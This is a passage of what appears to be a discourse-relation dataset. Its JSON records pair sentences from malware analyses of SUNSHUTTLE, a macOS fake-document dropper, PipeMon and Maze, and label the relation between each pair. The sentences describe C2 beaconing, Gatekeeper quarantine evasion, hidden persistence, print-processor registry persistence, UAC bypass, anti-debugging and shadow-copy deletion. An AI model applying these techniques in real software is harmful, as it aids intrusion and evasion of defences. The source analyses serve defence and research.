        "S1": "Upon an HTTP 200 response from the request, the response data from the C2 is expected to not contain the following string for the sample analyzed: ywQdjLuHHC",
        "S2": "The request_session_key routine returns a 1 if the string is not in the response and a -1 if it is in the response.",
        "relation": "NEXT"
    },
    {
        "S1": "The request_session_key routine returns a 1 if the string is not in the response and a -1 if it is in the response.",
        "S2": "If the result of the request_session_key is 1, SUNSHUTTLE will execute the retrieve_session_key routine.",
        "relation": "IF_ELSE"
    },
    {
        "S1": "If the result of the request_session_key is 1, SUNSHUTTLE will execute the retrieve_session_key routine.",
        "S2": "The retrieve_session_key routine again contacts the C2 and downloads content that is expected to be decrypted by the aforementioned embedded private key.",
        "relation": "NEXT"
    },
    {
        "S1": "The retrieve_session_key routine again contacts the C2 and downloads content that is expected to be decrypted by the aforementioned embedded private key.",
        "S2": "The decrypted content is likely a session key used to encrypt content once SUNSHUTTLE transitions to its command-and-control routines.",
        "relation": "NEXT"
    },
    {
        "S1": "The decrypted content is likely a session key used to encrypt content once SUNSHUTTLE transitions to its command-and-control routines.",
        "S2": "Once a session key is retrieved from the C2, SUNSHUTTLE begins the beaconing and \u201cresolve_command\u201d routines in a loop.",
        "relation": "NEXT"
    },
    {
        "S1": "Once a session key is retrieved from the C2, SUNSHUTTLE begins the beaconing and \u201cresolve_command\u201d routines in a loop.",
        "S2": "SUNSHUTTLE first issues a beacon to retrieve a command.",
        "relation": "ELABORATION"
    },
    {
        "S1": "SUNSHUTTLE first issues a beacon to retrieve a command.",
        "S2": "After, SUNSHUTTLE will enter the routine \u201cresolve_command\u201d, which parses the response content to determine which command should be run.",
        "relation": "NEXT"
    },
    {
        "S1": "After, SUNSHUTTLE will enter the routine \u201cresolve_command\u201d, which parses the response content to determine which command should be run.",
        "S2": "Available commands include remotely updating its configuration, file upload and download, and arbitrary command execution.",
        "relation": "ELABORATION"
    },
    {
        "S1": "Available commands include remotely updating its configuration, file upload and download, and arbitrary command execution.",
        "S2": "The content returned from the C2 after the \u201cmain_beaconing\u201d routine is Base64 decoded and AES decrypted",
        "relation": "MISC"
    },
    {
        "S1": "The content returned from the C2 after the \u201cmain_beaconing\u201d routine is Base64 decoded and AES decrypted",
        "S2": ".",
        "relation": "MISC"
    },
    {
        "S1": ".",
        "S2": "A check is performed to ensure the decrypted content doesn\u2019t contain the following string: Cp5RTQ31R1",
        "relation": "MISC"
    },
    {
        "S1": "A check is performed to ensure the decrypted content doesn\u2019t contain the following string: Cp5RTQ31R1",
        "S2": "As noted, it is likely these strings are unique per sample and randomly generated at compilation.",
        "relation": "ELABORATION"
    },
    {
        "S1": "As noted, it is likely these strings are unique per sample and randomly generated at compilation.",
        "S2": "The decrypted content is parsed for certain unique strings.",
        "relation": "MISC"
    },
    {
        "S1": "The decrypted content is parsed for certain unique strings.",
        "S2": "After successful execution of the malware, it drops the following files to the victim\u2019s system: <current_directory>\\config.dat.tmp (MD5: Dynamic) Encrypted configuration file",
        "relation": "MISC"
    },
    {
        "S1": "After successful execution of the malware, it drops the following files to the victim\u2019s system: <current_directory>\\config.dat.tmp (MD5: Dynamic) Encrypted configuration file",
        "S2": "The SUNSHUTTLE malware was not observed setting its own persistence.",
        "relation": "ELABORATION"
    },
    {
        "S1": "The SUNSHUTTLE malware was not observed setting its own persistence.",
        "S2": "It is likely the persistence is set outside of the execution of SUNSHUTTLE.",
        "relation": "ELABORATION"
    },
    {
        "S1": "It is likely the persistence is set outside of the execution of SUNSHUTTLE.",
        "S2": "SUNSHUTTLE uses the cookie header to pass values to the C2.",
        "relation": "ELABORATION"
    },
    {
        "S1": "SUNSHUTTLE uses the cookie header to pass values to the C2.",
        "S2": "Additionally, a referrer is selected from the following list, presumably to make the traffic blend in if traffic is being decrypted for inspection:",
        "relation": "ELABORATION"
    },
    {
        "S1": "Additionally, a referrer is selected from the following list, presumably to make the traffic blend in if traffic is being decrypted for inspection:",
        "S2": "The cookie headers vary slightly depending on the operation being performed.",
        "relation": "MISC"
    },
    {
        "S1": "The cookie headers vary slightly depending on the operation being performed.",
        "S2": "The following is an example request to the C2 from the \u201crequest_session_key\u201d routine.",
        "relation": "MISC"
    },
    {
        "S1": "The malware is delivered as an application disguised as an MS Office Word doc.",
        "S2": "The previous research noted that the malware deploys a novel trick to prevent MS Office attempting to launch the disguised app as a doc by embedding a unicode character in the file name.",
        "relation": "ELABORATION"
    },
    {
        "S1": "The previous research noted that the malware deploys a novel trick to prevent MS Office attempting to launch the disguised app as a doc by embedding a unicode character in the file name.",
        "S2": "This causes launch services to call \u201copen\u201d on the file rather than the default program for \u201c.doc\u201d.",
        "relation": "NEXT"
    },
    {
        "S1": "This causes launch services to call \u201copen\u201d on the file rather than the default program for \u201c.doc\u201d.",
        "S2": "On launch, the malware switches out the malicious application bundle for an actual MS Office doc: the same file name is used but now minus the hidden Unicode character.",
        "relation": "NEXT"
    },
    {
        "S1": "On launch, the malware switches out the malicious application bundle for an actual MS Office doc: the same file name is used but now minus the hidden Unicode character.",
        "S2": "After the bait and switch, this doc is launched and presented to the user.",
        "relation": "NEXT"
    },
    {
        "S1": "After the bait and switch, this doc is launched and presented to the user.",
        "S2": "The whole trick is invisible to the user, who only sees a document appearing with the same name as the one they double-clicked on.",
        "relation": "ELABORATION"
    },
    {
        "S1": "The whole trick is invisible to the user, who only sees a document appearing with the same name as the one they double-clicked on.",
        "S2": "Meanwhile, the second stage payload has been deposited in the /tmp folder and begins its run to install a hidden persistence agent and the third stage malicious executable.",
        "relation": "MISC"
    },
    {
        "S1": "Meanwhile, the second stage payload has been deposited in the /tmp folder and begins its run to install a hidden persistence agent and the third stage malicious executable.",
        "S2": "That trick is accompanied by the borrowing of a technique that has become popular among commodity adware and malware distributors; namely, using a shell script both as the main executable inside the app bundle and also as a vehicle to drop an embedded base64-encoded payload.",
        "relation": "MISC"
    },
    {
        "S1": "That trick is accompanied by the borrowing of a technique that has become popular among commodity adware and malware distributors; namely, using a shell script both as the main executable inside the app bundle and also as a vehicle to drop an embedded base64-encoded payload.",
        "S2": "Note line 4, which defines a variable with around 850Kb of base64-encoded data.",
        "relation": "MISC"
    },
    {
        "S1": "Note line 4, which defines a variable with around 850Kb of base64-encoded data.",
        "S2": "At line 40, that data is piped through the base64 utility for decoding, dropped in a subfolder in the /tmp directory, given executable permissions via chmod , and then launched as the 2nd stage payload.",
        "relation": "NEXT"
    },
    {
        "S1": "At line 40, that data is piped through the base64 utility for decoding, dropped in a subfolder in the /tmp directory, given executable permissions via chmod , and then launched as the 2nd stage payload.",
        "S2": "Importantly, prior to line 40, the script takes measures to deal with two macOS security features: App Translocation and file quarantine.",
        "relation": "ELABORATION"
    },
    {
        "S1": "Importantly, prior to line 40, the script takes measures to deal with two macOS security features: App Translocation and file quarantine.",
        "S2": "The former was a security feature brought in by Apple to prevent executables accessing external resources via relative paths and bypassing Gatekeeper checks.",
        "relation": "ELABORATION"
    },
    {
        "S1": "The former was a security feature brought in by Apple to prevent executables accessing external resources via relative paths and bypassing Gatekeeper checks.",
        "S2": "However, like Gatekeeper itself, App Translocation relies on the executable being tagged with the com.apple.quarantine bit.",
        "relation": "ELABORATION"
    },
    {
        "S1": "However, like Gatekeeper itself, App Translocation relies on the executable being tagged with the com.apple.quarantine bit.",
        "S2": "In this case, the script agressively attempts to remove all quarantine bits and, in the event any of those fail and the malware finds itself translocated to a read-only filepath, it then undertakes a hunt for the original downloaded file via its MD5 hash and attempts to execute it from its non-translocated path on disk.",
        "relation": "ELABORATION"
    },
    {
        "S1": "In this case, the script agressively attempts to remove all quarantine bits and, in the event any of those fail and the malware finds itself translocated to a read-only filepath, it then undertakes a hunt for the original downloaded file via its MD5 hash and attempts to execute it from its non-translocated path on disk.",
        "S2": "The second stage payload, once dumped from the encoded base64, is a universal FAT binary containing Mach-Os for i386 and x86_64 architectures.",
        "relation": "MISC"
    },
    {
        "S1": "The second stage payload, once dumped from the encoded base64, is a universal FAT binary containing Mach-Os for i386 and x86_64 architectures.",
        "S2": "The source code was written in C++.",
        "relation": "ELABORATION"
    },
    {
        "S1": "The source code was written in C++.",
        "S2": "As earlier research pointed out, this stage is responsible for dropping a persistence agent with the label of \u201ccom.apple.marcoagent.voiceinstallerd\u201d and its program argument, \u201cmount_devfs\u201d.",
        "relation": "MISC"
    },
    {
        "S1": "As earlier research pointed out, this stage is responsible for dropping a persistence agent with the label of \u201ccom.apple.marcoagent.voiceinstallerd\u201d and its program argument, \u201cmount_devfs\u201d.",
        "S2": "However, we also note that this stage has code for testing the UID and determining whether the executable is being run as root or not.",
        "relation": "ELABORATION"
    },
    {
        "S1": "However, we also note that this stage has code for testing the UID and determining whether the executable is being run as root or not.",
        "S2": "If so, the persistence mechanism is now written to /Library/LaunchDaemons instead of the user\u2019s Library LaunchAgents folder.",
        "relation": "IF_ELSE"
    },
    {
        "S1": "If so, the persistence mechanism is now written to /Library/LaunchDaemons instead of the user\u2019s Library LaunchAgents folder.",
        "S2": "In either case, the program argument is the same, pointing to a custom subfolder in the Library folder called \u201cUser Photos\u201d and an executable, mount_devfs , which is similarly a universal FAT binary containing Mach-Os written in C++.",
        "relation": "ELABORATION"
    },
    {
        "S1": "In either case, the program argument is the same, pointing to a custom subfolder in the Library folder called \u201cUser Photos\u201d and an executable, mount_devfs , which is similarly a universal FAT binary containing Mach-Os written in C++.",
        "S2": "A further point not mentioned in the earlier research is that the Launch Agent or Launch Daemon is written using the \u201cHidden\u201d flag so that users won\u2019t see it in the Finder by default.",
        "relation": "MISC"
    },
    {
        "S1": "A further point not mentioned in the earlier research is that the Launch Agent or Launch Daemon is written using the \u201cHidden\u201d flag so that users won\u2019t see it in the Finder by default.",
        "S2": "According to the earlier research, the malicious \u201cmount_devfs\u201d file provides the actors with backdoor capabilities, which include the ability to exfiltrate information as well as download files to the target machine.",
        "relation": "MISC"
    },
    {
        "S1": "According to the earlier research, the malicious \u201cmount_devfs\u201d file provides the actors with backdoor capabilities, which include the ability to exfiltrate information as well as download files to the target machine.",
        "S2": "For downloading, the actors make use of the same built-in dylib as we\u2019ve seen used by Lazarus APT, libcurl.4.dylib .",
        "relation": "ELABORATION"
    },
    {
        "S1": "For downloading, the actors make use of the same built-in dylib as we\u2019ve seen used by Lazarus APT, libcurl.4.dylib .",
        "S2": "The third stage payload has the ability to collect data regarding the device and its environment, including the computer host name.",
        "relation": "NEXT"
    },
    {
        "S1": "The third stage payload has the ability to collect data regarding the device and its environment, including the computer host name.",
        "S2": "Curiously, the sample has two hardcoded strings that presumably are meant as a \u201ccalling card\u201d or have some internal meaning to the malware developers:",
        "relation": "ELABORATION"
    },
    {
        "S1": "PipeMon\u2019s first stage consists of a password-protected RARSFX executable embedded in the .rsrc section of its launcher.",
        "S2": "The launcher writes the RARSFX to setup0.exe in a directory named with a randomly generated, eight-character, ASCII string located in the directory returned by GetTempPath.",
        "relation": "ELABORATION"
    },
    {
        "S1": "The launcher writes the RARSFX to setup0.exe in a directory named with a randomly generated, eight-character, ASCII string located in the directory returned by GetTempPath.",
        "S2": "Once written to disk, the RARSFX is executed with CreateProcess by providing the decryption password in an argument, as follows: setup0.exe -p*|T/PMR{|T2^LWJ*",
        "relation": "NEXT"
    },
    {
        "S1": "Once written to disk, the RARSFX is executed with CreateProcess by providing the decryption password in an argument, as follows: setup0.exe -p*|T/PMR{|T2^LWJ*",
        "S2": "Note that the password is different with each sample.",
        "relation": "ELABORATION"
    },
    {
        "S1": "Note that the password is different with each sample.",
        "S2": "The content of the RARSFX is then extracted into %TMP%\\RarSFX0 and consists of the following files:",
        "relation": "MISC"
    },
    {
        "S1": "The content of the RARSFX is then extracted into %TMP%\\RarSFX0 and consists of the following files:",
        "S2": "- CrLnc.dat \u2013 Encrypted payload",
        "relation": "ELABORATION"
    },
    {
        "S1": "- CrLnc.dat \u2013 Encrypted payload",
        "S2": "- Duser.dll \u2013 Used for UAC bypass",
        "relation": "LIST"
    },
    {
        "S1": "- Duser.dll \u2013 Used for UAC bypass",
        "S2": "- osksupport.dll \u2013 Used for UAC bypass",
        "relation": "LIST"
    },
    {
        "S1": "- osksupport.dll \u2013 Used for UAC bypass",
        "S2": "- PrintDialog.dll \u2013 Used for the malicious print processor initialization",
        "relation": "LIST"
    },
    {
        "S1": "- PrintDialog.dll \u2013 Used for the malicious print processor initialization",
        "S2": "- PrintDialog.exe \u2013 Legitimate Windows executable used to load PrintDialog.dll",
        "relation": "LIST"
    },
    {
        "S1": "- PrintDialog.exe \u2013 Legitimate Windows executable used to load PrintDialog.dll",
        "S2": "- setup.dll \u2013 Installation DLL",
        "relation": "LIST"
    },
    {
        "S1": "- setup.dll \u2013 Installation DLL",
        "S2": "- setup.exe \u2013 Main executable",
        "relation": "LIST"
    },
    {
        "S1": "- setup.exe \u2013 Main executable",
        "S2": "Note that in the event of a folder name collision, the number at the end of the RarSFX0 string is incremented until a collision is avoided.",
        "relation": "MISC"
    },
    {
        "S1": "Note that in the event of a folder name collision, the number at the end of the RarSFX0 string is incremented until a collision is avoided.",
        "S2": "Further, not all these files are necessarily present in the archive, depending on the installer.",
        "relation": "ELABORATION"
    },
    {
        "S1": "Further, not all these files are necessarily present in the archive, depending on the installer.",
        "S2": "Once extracted, setup.exe is executed without arguments.",
        "relation": "MISC"
    },
    {
        "S1": "Once extracted, setup.exe is executed without arguments.",
        "S2": "Its sole purpose is to load setup.dll using LoadLibraryA.",
        "relation": "NEXT"
    },
    {
        "S1": "Its sole purpose is to load setup.dll using LoadLibraryA.",
        "S2": "Once loaded, setup.dll checks whether an argument in the format \u2013x:n (where n is an integer) was provided; the mode of operation will be different depending on the presence of n.",
        "relation": "NEXT"
    },
    {
        "S1": "Once loaded, setup.dll checks whether an argument in the format \u2013x:n (where n is an integer) was provided; the mode of operation will be different depending on the presence of n.",
        "S2": "Supported arguments and their corresponding behavior are shown in Table 1.",
        "relation": "ELABORATION"
    },
    {
        "S1": "Supported arguments and their corresponding behavior are shown in Table 1.",
        "S2": "setup.exe is executed without arguments by the RARSFX, and checks whether it\u2019s running with elevated privileges.",
        "relation": "MISC"
    },
    {
        "S1": "setup.exe is executed without arguments by the RARSFX, and checks whether it\u2019s running with elevated privileges.",
        "S2": "If not, it will attempt to obtain such privileges using token impersonation if the version of Windows is below Windows 7 build 7601; otherwise it will attempt different UAC bypass techniques, allowing installation of the payload loader into one of:",
        "relation": "IF_ELSE"
    },
    {
        "S1": "If not, it will attempt to obtain such privileges using token impersonation if the version of Windows is below Windows 7 build 7601; otherwise it will attempt different UAC bypass techniques, allowing installation of the payload loader into one of:",
        "S2": "depending on the variant.",
        "relation": "MISC"
    },
    {
        "S1": "depending on the variant.",
        "S2": "Note that we weren\u2019t able to retrieve samples related to Interactive.dll.",
        "relation": "MISC"
    },
    {
        "S1": "Note that we weren\u2019t able to retrieve samples related to Interactive.dll.",
        "S2": "This loader is stored encrypted within setup.dll, which will decrypt it before writing it to the aforementioned location.",
        "relation": "ELABORATION"
    },
    {
        "S1": "This loader is stored encrypted within setup.dll, which will decrypt it before writing it to the aforementioned location.",
        "S2": "The location where the malicious DLL is dropped was not chosen randomly.",
        "relation": "ELABORATION"
    },
    {
        "S1": "The location where the malicious DLL is dropped was not chosen randomly.",
        "S2": "This is the path where Windows Print Processors are located and",
        "relation": "ELABORATION"
    },
    {
        "S1": "This is the path where Windows Print Processors are located and",
        "S2": "setup.dll registers the malicious DLL loader as an alternative Print Processor by setting one of the following registry values: HKLM\\SYSTEM\\ControlSet001\\Control\\Print\\Environments\\Windows x64\\Print Processors\\PrintFiiterPipelineSvc\\Driver = \u201cDEment.dll\u201d or HKLM\\SYSTEM\\CurrentControlSet\\Control\\Print\\Environments\\Windows x64\\Print Processors\\lltdsvc1\\Driver = \u201cEntAppsvc.dll\u201d",
        "relation": "MISC"
    },
    {
        "S1": "setup.dll registers the malicious DLL loader as an alternative Print Processor by setting one of the following registry values: HKLM\\SYSTEM\\ControlSet001\\Control\\Print\\Environments\\Windows x64\\Print Processors\\PrintFiiterPipelineSvc\\Driver = \u201cDEment.dll\u201d or HKLM\\SYSTEM\\CurrentControlSet\\Control\\Print\\Environments\\Windows x64\\Print Processors\\lltdsvc1\\Driver = \u201cEntAppsvc.dll\u201d",
        "S2": "depending on the variant.",
        "relation": "MISC"
    },
    {
        "S1": "depending on the variant.",
        "S2": "Note the typo in PrintFiiterPipelineSvc (which has no impact on the Print Processor installation since any name can be used).",
        "relation": "MISC"
    },
    {
        "S1": "Note the typo in PrintFiiterPipelineSvc (which has no impact on the Print Processor installation since any name can be used).",
        "S2": "After having registered the Print Processor, PipeMon restarts the print spooler service (spoolsv.exe).",
        "relation": "MISC"
    },
    {
        "S1": "After having registered the Print Processor, PipeMon restarts the print spooler service (spoolsv.exe).",
        "S2": "As a result, the malicious print process is loaded when the spooler service starts.",
        "relation": "NEXT"
    },
    {
        "S1": "As a result, the malicious print process is loaded when the spooler service starts.",
        "S2": "Note that the Print Spooler service starts at each PC startup, which ensures persistence across system resets.",
        "relation": "ELABORATION"
    },
    {
        "S1": "Note that the Print Spooler service starts at each PC startup, which ensures persistence across system resets.",
        "S2": "This technique is really similar to the Print Monitor persistence technique (being used by DePriMon, for example) and, to our knowledge, has not been documented previously.",
        "relation": "ELABORATION"
    },
    {
        "S1": "This technique is really similar to the Print Monitor persistence technique (being used by DePriMon, for example) and, to our knowledge, has not been documented previously.",
        "S2": "Additionally, the encrypted payload, CrLnc.dat, extracted from the RARSFX is written to the registry at the following location, depending on the installer:",
        "relation": "LIST"
    },
    {
        "S1": "Additionally, the encrypted payload, CrLnc.dat, extracted from the RARSFX is written to the registry at the following location, depending on the installer:",
        "S2": "This encrypted registry payload is then loaded, decrypted and executed by the previously registered Print Processor library.",
        "relation": "NEXT"
    },
    {
        "S1": "This encrypted registry payload is then loaded, decrypted and executed by the previously registered Print Processor library.",
        "S2": "The whole PipeMon staging and persistence is shown in Figure 1.",
        "relation": "MISC"
    },
    {
        "S1": "Maze is a complex piece of malware that uses some tricks to frustrate analysis right from the beginning.",
        "S2": "The malware starts preparing some functions that appear to save memory addresses in global variables to use later in dynamic calls though it does not actually use these functions later.",
        "relation": "MISC"
    },
    {
        "S1": "The malware starts preparing some functions that appear to save memory addresses in global variables to use later in dynamic calls though it does not actually use these functions later.",
        "S2": "Whether it is residual code existing in the entry point of the malware or a trick to mislead researchers is up for debate.",
        "relation": "ELABORATION"
    },
    {
        "S1": "Whether it is residual code existing in the entry point of the malware or a trick to mislead researchers is up for debate.",
        "S2": "Later, the malware enters in a big block of trash code that also includes some elements to decrypt strings and important information for later.",
        "relation": "MISC"
    },
    {
        "S1": "Later, the malware enters in a big block of trash code that also includes some elements to decrypt strings and important information for later.",
        "S2": "The malware uses some tricks to detect debuggers at this point.",
        "relation": "NEXT"
    },
    {
        "S1": "The malware uses some tricks to detect debuggers at this point.",
        "S2": "The most important of those are: A big use of the PEB field \u201cIsDebuggerPresent\u201d.",
        "relation": "ELABORATION"
    },
    {
        "S1": "The most important of those are: A big use of the PEB field \u201cIsDebuggerPresent\u201d.",
        "S2": "This field is a Boolean field that is filled from Windows with 1 (True) if the application is running inside of a debugger or 0 (False) if it is not.",
        "relation": "ELABORATION"
    },
    {
        "S1": "This field is a Boolean field that is filled from Windows with 1 (True) if the application is running inside of a debugger or 0 (False) if it is not.",
        "S2": "If the malware detects a debugger it will remain in an infinite loop without making anything while wasting system resources.",
        "relation": "IF_ELSE"
    },
    {
        "S1": "If the malware detects a debugger it will remain in an infinite loop without making anything while wasting system resources.",
        "S2": "The malware gets all processes in the system but ignores the first one (the \u2018idle process\u2019 in Windows which is simply a tool to let the user know what percentage of system resources are being used).",
        "relation": "NEXT"
    },
    {
        "S1": "The malware gets all processes in the system but ignores the first one (the \u2018idle process\u2019 in Windows which is simply a tool to let the user know what percentage of system resources are being used).",
        "S2": "Using the name of each process it makes a custom name with a custom algorithm, along with a hash that is checked against a hardcoded list.",
        "relation": "NEXT"
    },
    {
        "S1": "Using the name of each process it makes a custom name with a custom algorithm, along with a hash that is checked against a hardcoded list.",
        "S2": "If the hash is found in this list the process will be terminated.",
        "relation": "IF_ELSE"
    },
    {
        "S1": "If the hash is found in this list the process will be terminated.",
        "S2": "For example, the process of the debugger \u201cx32dbg\u201d, is caught at this point:",
        "relation": "ELABORATION"
    },
    {
        "S1": "For example, the process of the debugger \u201cx32dbg\u201d, is caught at this point:",
        "S2": "It can terminate IDA debugger, x32dbg, OllyDbg and more processes to avoid dynamic analysis, close databases, office programs and security tools.",
        "relation": "ELABORATION"
    },
    {
        "S1": "It can terminate IDA debugger, x32dbg, OllyDbg and more processes to avoid dynamic analysis, close databases, office programs and security tools.",
        "S2": "A partial list of the processes that can be cracked using a dictionary list terminated by the malware is shown below:",
        "relation": "ELABORATION"
    },
    {
        "S1": "A partial list of the processes that can be cracked using a dictionary list terminated by the malware is shown below:",
        "S2": "This short list shows the name of the process to kill and the custom hash from the special name generated from the original process name.",
        "relation": "ELABORATION"
    },
    {
        "S1": "This short list shows the name of the process to kill and the custom hash from the special name generated from the original process name.",
        "S2": "The malware will kill the process with the function \u201cTerminateProcess\u201d that it gets from the EAT (Export Address Table) of the module \u201ckernel32.dll\u201d to increase obfuscation, comparing the name with a custom hash taken from the name in high caps.",
        "relation": "ELABORATION"
    },
    {
        "S1": "The malware will kill the process with the function \u201cTerminateProcess\u201d that it gets from the EAT (Export Address Table) of the module \u201ckernel32.dll\u201d to increase obfuscation, comparing the name with a custom hash taken from the name in high caps.",
        "S2": "The malware calls Windows functions in a unique way to aid obfuscation, i.e. getting the first process in the system to use the function \u201cProcess32FirstW\u201d.",
        "relation": "NEXT"
    },
    {
        "S1": "The malware calls Windows functions in a unique way to aid obfuscation, i.e. getting the first process in the system to use the function \u201cProcess32FirstW\u201d.",
        "S2": "However, instead of calling it directly, it puts the parameters needed for the function on the stack, followed by a memory address with a \u201cpush\u201d opcode and then makes a direct jump to the Windows function.",
        "relation": "ELABORATION"
    },
    {
        "S1": "However, instead of calling it directly, it puts the parameters needed for the function on the stack, followed by a memory address with a \u201cpush\u201d opcode and then makes a direct jump to the Windows function.",
        "S2": "When the function ends, Windows makes a \u201cret\u201d opcode then gets the last memory address that the malware pushed inside the stack, returning to this address and continuing the flow.",
        "relation": "ELABORATION"
    },
    {
        "S1": "When the function ends, Windows makes a \u201cret\u201d opcode then gets the last memory address that the malware pushed inside the stack, returning to this address and continuing the flow.",
        "S2": "An example of this can be seen in this image:",
        "relation": "ELABORATION"
    },
    {
        "S1": "An example of this can be seen in this image:",
        "S2": "Another ploy utilized by the malware (depending of the sample) is to get the function \u201cDbgUIRemoteBreakin\u201d, using the function \u201cGetProcAddress\u201d, before employing a trick to avoid having a debugger attach to it in runtime[7].",
        "relation": "MISC"
    },
    {
        "S1": "Another ploy utilized by the malware (depending of the sample) is to get the function \u201cDbgUIRemoteBreakin\u201d, using the function \u201cGetProcAddress\u201d, before employing a trick to avoid having a debugger attach to it in runtime[7].",
        "S2": "The trick used here is \u201cVirtualProtect\u201d to give the function memory address of \u201cDbgUIRemoteBreakin\u201d permission to write to it:",
        "relation": "ELABORATION"
    },
    {
        "S1": "The trick used here is \u201cVirtualProtect\u201d to give the function memory address of \u201cDbgUIRemoteBreakin\u201d permission to write to it:",
        "S2": "After gaining permission, which is granted only for 1 byte, the malware patches this byte with a 0xC3 value (the opcode of \u201cret\u201d) and restores the previous permissions with \u201cVirtualProtect\u201d, again in the same address and byte, removing the write permission.",
        "relation": "NEXT"
    },
    {
        "S1": "After gaining permission, which is granted only for 1 byte, the malware patches this byte with a 0xC3 value (the opcode of \u201cret\u201d) and restores the previous permissions with \u201cVirtualProtect\u201d, again in the same address and byte, removing the write permission.",
        "S2": "This is done to avoid having a debugger attach to it in runtime.",
        "relation": "ELABORATION"
    },
    {
        "S1": "This is done to avoid having a debugger attach to it in runtime.",
        "S2": "This way, when a debugger attaches to the process internally, the system calls this function but, instead of creating a thread to start the debugging, the \u201cret\u201d opcode forces the function to return without creating it.",
        "relation": "ELABORATION"
    },
    {
        "S1": "This way, when a debugger attaches to the process internally, the system calls this function but, instead of creating a thread to start the debugging, the \u201cret\u201d opcode forces the function to return without creating it.",
        "S2": "In brief, it prevents a debugger from being attached correctly.",
        "relation": "ELABORATION"
    },
    {
        "S1": "In brief, it prevents a debugger from being attached correctly.",
        "S2": "It is done before enumerating the system process.",
        "relation": "ELABORATION"
    },
    {
        "S1": "It is done before enumerating the system process.",
        "S2": "The malware checks the language of the machine with function \u201cGetUserDefaultUILanguage\u201d and saves the value in the stack; it is not checked automatically after the call, but it is important later.",
        "relation": "MISC"
    },
    {
        "S1": "The malware checks the language of the machine with function \u201cGetUserDefaultUILanguage\u201d and saves the value in the stack; it is not checked automatically after the call, but it is important later.",
        "S2": "Maze creates a mutex with the name \u201cGlobal\\x\u201d where x is a special value that is unique per machine.",
        "relation": "MISC"
    },
    {
        "S1": "Maze creates a mutex with the name \u201cGlobal\\x\u201d where x is a special value that is unique per machine.",
        "S2": "For example, in the next screenshot (some information has been deleted to anonymize the machine used for the analysis) is an example of this behavior.",
        "relation": "MISC"
    },
    {
        "S1": "For example, in the next screenshot (some information has been deleted to anonymize the machine used for the analysis) is an example of this behavior.",
        "S2": "It is done to avoid two or more executions at the same time.",
        "relation": "MISC"
    },
    {
        "S1": "It is done to avoid two or more executions at the same time.",
        "S2": "The malware, after creating the mutex, makes calls to the function \u201cGetLastError\u201d to check against two errors:",
        "relation": "MISC"
    },
    {
        "S1": "The malware, after creating the mutex, makes calls to the function \u201cGetLastError\u201d to check against two errors:",
        "S2": "- 0x05 -> ERROR_ACCESS_DENIED.",
        "relation": "MISC"
    },
    {
        "S1": "- 0x05 -> ERROR_ACCESS_DENIED.",
        "S2": "If the malware gets this error, it means that the mutex already exists in the system but, for some reason, the malware cannot access it (perhaps privileges, policies, etcetera).",
        "relation": "MISC"
    },
    {
        "S1": "If the malware gets this error, it means that the mutex already exists in the system but, for some reason, the malware cannot access it (perhaps privileges, policies, etcetera).",
        "S2": "- 0xb7 -> ERROR_ALREADY_EXISTS.",
        "relation": "MISC"
    },
    {
        "S1": "- 0xb7 -> ERROR_ALREADY_EXISTS.",
        "S2": "If the malware gets this error, it means that the mutex already exists in the system and can be accessed.",
        "relation": "MISC"
    },
    {
        "S1": "If the malware gets this error, it means that the mutex already exists in the system and can be accessed.",
        "S2": "If either of the above occur, the malware remains in execution but does not crypt any files in the system or use any resources of the machine.",
        "relation": "IF_ELSE"
    },
    {
        "S1": "If either of the above occur, the malware remains in execution but does not crypt any files in the system or use any resources of the machine.",
        "S2": "It means that it will appear in the program list using 0% of the processor.",
        "relation": "ELABORATION"
    },
    {
        "S1": "It means that it will appear in the program list using 0% of the processor.",
        "S2": "The mutex value changes either per sample or on a periodic basis to avoid the possibility of vaccines being made against it.",
        "relation": "MISC"
    },
    {
        "S1": "The mutex value changes either per sample or on a periodic basis to avoid the possibility of vaccines being made against it.",
        "S2": "The malware also has a command to avoid the \u2018problem\u2019 of vaccines which will be explained later.",
        "relation": "ELABORATION"
    },
    {
        "S1": "The malware also has a command to avoid the \u2018problem\u2019 of vaccines which will be explained later.",
        "S2": "After the mutex, the malware checks the language previously saved in the stack against, for example, language 0x419 (Russian from the Russian Federation, ru-RU[8]).",
        "relation": "MISC"
    },
    {
        "S1": "After the mutex, the malware checks the language previously saved in the stack against, for example, language 0x419 (Russian from the Russian Federation, ru-RU[8]).",
        "S2": "The checks are done in an obfuscated way within the jumble of the code that the malware has (in the virtual machine used here the Spanish language of Spain (es-ES) was used; it is the code 0xC0A that appears in the stack in the screenshot):",
        "relation": "ELABORATION"
    },
    {
        "S1": "The checks are done in an obfuscated way within the jumble of the code that the malware has (in the virtual machine used here the Spanish language of Spain (es-ES) was used; it is the code 0xC0A that appears in the stack in the screenshot):",
        "S2": "If the language matches any of those in the list below, the malware will clean the memory and exit the main thread without wasting any resources or making any files.",
        "relation": "IF_ELSE"
    },
    {
        "S1": "If the language matches any of those in the list below, the malware will clean the memory and exit the main thread without wasting any resources or making any files.",
        "S2": "The malware tries to delete the shadow volumes in the system using the \u201cwmic.exe\u201d program with the switches \u201cshadowcopy\u201d and \u201cdelete\u201d.",
        "relation": "NEXT"
    },
    {
        "S1": "The malware tries to delete the shadow volumes in the system using the \u201cwmic.exe\u201d program with the switches \u201cshadowcopy\u201d and \u201cdelete\u201d.",
        "S2": "Prior to this, the malware gets the function of \u201cWoW64DisableWow64FsRedirection\u201d with \u201cGetProcAddress\u201d and uses it to avoid redirection by default in 64-bit operating systems and calls it in a dynamic way.",
        "relation": "ELABORATION"
    },
    {
        "S1": "Prior to this, the malware gets the function of \u201cWoW64DisableWow64FsRedirection\u201d with \u201cGetProcAddress\u201d and uses it to avoid redirection by default in 64-bit operating systems and calls it in a dynamic way.",
        "S2": "The malware tries to delete the shadow copies two times, once before crypting the files in the infected system and secondly after crypting them.",
        "relation": "NEXT"
    },
    {
        "S1": "The malware tries to delete the shadow copies two times, once before crypting the files in the infected system and secondly after crypting them.",
        "S2": "This execution is done with the function \u201cCreateProcessW\u201d but, to increase the level of obfuscation, the malware is launched with this command:",
        "relation": "ELABORATION"
    },
    {
        "S1": "This execution is done with the function \u201cCreateProcessW\u201d but, to increase the level of obfuscation, the malware is launched with this command:",
        "S2": "As you can see in the image above, the malware uses a command with the name of folders that do not exist by default in Windows, except \u201cWindows\u201d, \u201csystem32\u201d and \u201cwbem\u201d.",
        "relation": "ELABORATION"
    },
    {
        "S1": "As you can see in the image above, the malware uses a command with the name of folders that do not exist by default in Windows, except \u201cWindows\u201d, \u201csystem32\u201d and \u201cwbem\u201d.",
        "S2": "It enters these folders but then promptly exits them using the command \u201c..\u201d, meaning it returns to the previous folder in the path.",
